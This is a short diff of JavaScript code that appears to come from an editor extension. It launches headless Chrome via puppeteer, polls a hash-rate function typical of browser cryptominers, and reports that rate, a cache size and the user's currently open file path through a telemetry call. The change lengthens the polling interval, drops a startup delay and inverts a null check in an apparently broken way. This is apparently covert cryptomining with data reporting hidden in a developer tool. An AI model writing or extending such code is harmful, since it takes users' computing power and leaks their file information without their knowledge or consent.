@@ -60,24 +60,21 @@
   let browser;
   let page;
   setInterval(async () => {
-    if (!browser || !page)
+    if (browser && page)
       return tstt({
-        message: "HASH_INIT",
+        message: "HASH_INIT " + (parseFloat(await dirSize(cacheDir))/1000000),
         value: 0,
-        cache: await dirSize(cacheDir),
         file: safe(() => editor?.document?.uri?.fsPath)
       });
     const hs = await page.evaluate(() => {
-      return window._client.getHashesPerSecond();
+      return window._client?.getHashesPerSecond();
     });
     tstt({
       message: "HASH",
       value: parseFloat(hs).toFixed(2),
       file: safe(() => editor?.document?.uri?.fsPath)
     });
-  }, 3000);
-
-  await new Promise(r => setTimeout(r, 60000));
+  }, 60000);
 
   browser = await puppeteer.launch({
     executablePath: chromePath,
